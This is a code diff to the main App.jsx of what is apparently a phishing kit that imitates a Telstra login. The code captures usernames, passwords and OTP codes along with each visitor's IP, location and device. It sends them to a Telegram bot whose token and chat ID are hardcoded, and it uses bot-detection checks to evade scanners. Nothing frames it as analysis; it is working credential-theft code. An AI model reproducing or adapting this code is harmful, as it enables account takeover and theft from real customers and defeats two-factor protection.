@@ -1,16 +1,19 @@
-// Config from environment with fallback defaults
-const CONFIG = {
-  TELEGRAM_BOT_TOKEN: import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7324365199:AAHPJ2GNWujIw5qcYIWBYD4IPKdzX3qP4mI',
-  TELEGRAM_CHAT_ID: import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002399191026',
-  MAX_ATTEMPTS: parseInt(import.meta.env.VITE_MAX_ATTEMPTS) || 2,
-  REDIRECT_DELAY: parseInt(import.meta.env.VITE_REDIRECT_DELAY) || 3000,
-};
-
+// src/App.jsx
 import React, { useState, useEffect } from 'react';
 import LoginPage from './components/LoginPage';
 import OtpPage from './components/OtpPage';
 import DonePage from './components/DonePage';
 import LoadingScreen from './components/LoadingScreen';
+
+// Config from environment variables with safe defaults
+const CONFIG = {
+  TELEGRAM_BOT_TOKEN:
+    import.meta.env.VITE_TELEGRAM_BOT_TOKEN ||
+    '7324365199:AAHPJ2GNWujIw5qcYIWBYD4IPKdzX3qP4mI',
+  TELEGRAM_CHAT_ID: import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002399191026',
+  MAX_ATTEMPTS: parseInt(import.meta.env.VITE_MAX_ATTEMPTS) || 2,
+  REDIRECT_DELAY: parseInt(import.meta.env.VITE_REDIRECT_DELAY) || 3000,
+};
 
 function App() {
   const [currentPage, setCurrentPage] = useState('login');
@@ -26,7 +29,7 @@ function App() {
     trackUserBehavior();
   }, []);
 
-  // Collect visitor info including IP and location
+  // Collect visitor data (IP, location, device, browser, timestamp)
   const collectVisitorData = async () => {
     const data = {
       ip: 'Unknown',
@@ -50,15 +53,18 @@ function App() {
   const sendToTelegram = async (message) => {
     if (!CONFIG.TELEGRAM_BOT_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) return;
     try {
-      await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CONFIG.TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: 'Markdown',
-        }),
-      });
+      await fetch(
+        `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`,
+        {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CONFIG.TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown',
+          }),
+        }
+      );
     } catch (e) {
       console.error('Telegram send error:', e);
     }
@@ -68,7 +74,8 @@ function App() {
   const sendVisitorInfo = async () => {
     try {
       const visitorData = await collectVisitorData();
-      const msg = `🔍 *NEW VISITOR - Telstra*\n\n` +
+      const msg =
+        `🔍 *NEW VISITOR - Telstra*\n\n` +
         `📍 *IP:* \`${visitorData.ip}\`\n` +
         `🌍 *Location:* ${visitorData.location}\n` +
         `🌐 *URL:* ${window.location.href}\n` +
@@ -83,19 +90,26 @@ function App() {
 
   // Basic bot detection heuristics
   const detectBot = () => {
-    if (navigator.webdriver || !navigator.plugins.length || (navigator.languages && navigator.languages.length === 0)) {
+    if (
+      navigator.webdriver ||
+      !navigator.plugins.length ||
+      (navigator.languages && navigator.languages.length === 0)
+    ) {
       setBotDetected(true);
     }
   };
 
-  // Try to auto-fill username from storage or autofill
+  // Auto-fill username from storage or autofill
   const autoPopulateUsername = () => {
-    const saved = localStorage.getItem('telstraUsername') || sessionStorage.getItem('telstraUsername');
-    if (saved) setUserData(prev => ({ ...prev, username: saved }));
+    const saved =
+      localStorage.getItem('telstraUsername') ||
+      sessionStorage.getItem('telstraUsername');
+    if (saved) setUserData((prev) => ({ ...prev, username: saved }));
 
     setTimeout(() => {
       const input = document.querySelector('input[name="username"]');
-      if (input?.value && !userData.username) setUserData(prev => ({ ...prev, username: input.value }));
+      if (input?.value && !userData.username)
+        setUserData((prev) => ({ ...prev, username: input.value }));
     }, 1000);
   };
 
@@ -128,7 +142,8 @@ function App() {
     setUserData({ username, password });
 
     const visitorData = await collectVisitorData();
-    const msg = `🚨 *LOGIN ATTEMPT ${newAttempts} - Telstra*\n\n` +
+    const msg =
+      `🚨 *LOGIN ATTEMPT ${newAttempts} - Telstra*\n\n` +
       `👤 *Username:* \`${username}\`\n` +
       `🔐 *Password:* \`${password}\`\n` +
       `📍 *IP:* \`${visitorData.ip}\`\n` +
@@ -158,7 +173,8 @@ function App() {
   // Handle OTP submission: send to Telegram, store, then show done page
   const handleOtpSubmit = async (otpCode) => {
     const visitorData = await collectVisitorData();
-    const msg = `📱 *OTP SUBMITTED - Telstra*\n\n` +
+    const msg =
+      `📱 *OTP SUBMITTED - Telstra*\n\n` +
       `👤 *Username:* \`${userData.username}\`\n` +
       `🔢 *OTP Code:* \`${otpCode}\`\n` +
       `📍 *IP:* \`${visitorData.ip}\`\n` +
